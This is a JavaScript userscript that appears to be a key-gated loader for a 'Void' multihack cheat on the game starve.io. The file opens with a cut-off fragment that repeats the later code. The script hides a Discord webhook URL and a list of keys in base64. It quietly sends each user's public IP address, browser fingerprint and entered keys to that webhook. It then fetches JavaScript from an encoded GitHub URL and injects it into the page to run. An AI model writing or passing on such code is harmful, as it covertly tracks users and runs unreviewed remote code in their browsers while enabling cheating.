                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();
